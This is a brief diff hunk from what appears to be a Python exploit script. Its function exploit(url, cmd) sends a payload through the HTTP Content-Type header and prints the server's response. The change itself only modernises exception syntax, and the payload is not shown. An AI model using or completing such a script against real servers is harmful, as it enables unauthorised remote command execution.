@@ -27,7 +27,7 @@ def exploit(url, cmd):
         headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
         request = urllib2.Request(url, headers=headers)
         page = urllib2.urlopen(request).read()
-    except httplib.IncompleteRead, e:
+    except httplib.IncompleteRead as e:
         page = e.partial
 
     print(page)
